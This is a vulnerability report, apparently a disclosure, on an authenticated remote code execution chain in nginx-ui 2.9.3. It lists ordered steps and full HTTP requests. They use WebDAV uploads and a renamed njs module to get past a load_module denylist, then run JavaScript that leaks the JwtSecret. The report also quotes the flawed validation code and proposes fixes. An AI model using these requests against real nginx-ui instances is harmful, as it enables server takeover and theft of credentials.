### Vulnerability details

**Official website / Product:** https://github.com/0xJacky/nginx-ui

**Repository:** 0xJacky/nginx-ui (stars at selection: 11713)

**Vulnerability type:** RCE

**Vulnerability versions:** nginx-ui 2.9.3 (official image `uozi/nginx-ui:latest`, binary `79785c5f`); audited source tip `c769fa2`

**Vulnerability URL / Parameter:** `POST /api/configs`, `POST /api/config` (write `dav_methods` / `load_module`), WebDAV `PUT /dav/*`, `POST /api/nginx/restart|reload`; impact via `GET /pwn`

**Complex:** yes

### Verification procedure

1. Start the official image locally (`docker compose up -d`, ports 18105/18180).
2. Complete install with `/etc/nginx-ui/.install_secret` + RSA `encrypted_params`, then login for a JWT.
3. `POST /api/configs` writes `conf.d/dav.conf` enabling `dav_methods`, `alias /tmp/davroot/`, and `include /tmp/davroot/*.conf;` (accepted by `ValidateConfigFile`).
4. WebDAV `PUT` copies the shipped `ngx_http_js_module.so` to `/dav/njs.so` → `/tmp/davroot/njs.so`.
5. `POST /api/config` updates `nginx.conf` with `load_module /tmp/davroot/njs.so;` in the main context — **accepted**. Control: `load_module .../ngx_http_js_module.so` is rejected (40017).
6. `POST /api/nginx/restart` so the dynamic module loads.
7. WebDAV drops `pwn.conf` / `pwn.js` containing `js_import` / `js_content` (**never** passes the directive denylist).
8. After reload, `GET http://127.0.0.1:18180/pwn` returns `RCE_OK`, writes `/tmp/RCE_VIA_RENAMED_LOAD_MODULE.txt`, and reads `JwtSecret` from `/etc/nginx-ui/app.ini`.

Vulnerability HTTP request:

```http
POST /api/config HTTP/1.1
Host: 127.0.0.1:18105
Authorization: Bearer <admin-jwt>
Content-Type: application/json

{"path":"nginx.conf","content":"load_module /tmp/davroot/njs.so;\nuser  nginx;\n..."}

PUT /dav/njs.so HTTP/1.1
Host: 127.0.0.1:18180
Content-Length: 2410144

<bytes of ngx_http_js_module.so>

PUT /dav/pwn.conf HTTP/1.1
Host: 127.0.0.1:18180

js_import pwn from /tmp/davroot/pwn.js;
location = /pwn { js_content pwn.pwn; }

GET /pwn HTTP/1.1
Host: 127.0.0.1:18180
```

Verification result:

- Renamed-path `load_module` accepted (200); original module path rejected (40017).
- WebDAV `PUT /dav/njs.so` → 201; `PUT /dav/pwn.conf` → 201.
- `GET /pwn` → 200 body starting with `RCE_OK` and leaking `JwtSecret`; marker file `/tmp/RCE_VIA_RENAMED_LOAD_MODULE.txt` contains `r1-a5-rce-ok`.

### Vulnerability analysis

`ValidateConfigDirectives` denylists `js_*` / `perl_*` and selected `load_module` targets to stop code execution via modules shipped in the official image. `loadsRestrictedDynamicModule` only substring-matches fixed basenames (`ngx_http_js_module.so`, …). Copying that `.so` to a path without those names (via undenylisted `dav_methods` into `/tmp/davroot/njs.so`) lets `load_module /tmp/davroot/njs.so` pass validation and load njs after restart.

An `include /tmp/davroot/*.conf` then pulls in WebDAV-uploaded configs that never go through `ValidateConfigFile`, so blocked `js_import` / `js_content` still run inside the loaded njs engine — authenticated RCE as the nginx worker. Live controls on 2.9.3 still reject API-written `js_import` and the original-path `load_module`, showing a denylist implementation flaw rather than “config admins can do anything” alone.

Vulnerable trigger / sink source (complete path and line numbers):

```go
# File: internal/config/validation.go
# Lines: 170-174, 392-394, 654-665
var blockedDynamicModules = []string{
	"ngx_http_js_module.so",
	"ngx_stream_js_module.so",
	"ngx_http_perl_module.so",
}

if directive == "load_module" && loadsRestrictedDynamicModule(statement) {
	return cosy.WrapErrorWithParams(ErrConfigDirectiveNotAllowed, "load_module")
}

func loadsRestrictedDynamicModule(statement []string) bool {
	for _, token := range statement[1:] {
		lowerToken := strings.ToLower(token)
		for _, moduleName := range blockedDynamicModules {
			if strings.Contains(lowerToken, strings.ToLower(moduleName)) {
				return true
			}
		}
	}
	return false
}
```

### Vulnerability Fix

1. Deny or tightly constrain `dav_methods` and `include` targets under attacker-writable directories; re-apply the same directive policy to include targets before reload.
2. Default-deny `load_module`, or allowlist modules by realpath/inode; refuse `.so` files under the WebDAV root or outside a trusted modules directory.
3. If njs must remain available on the official image, enforce policy on both the load path and every config-write channel.
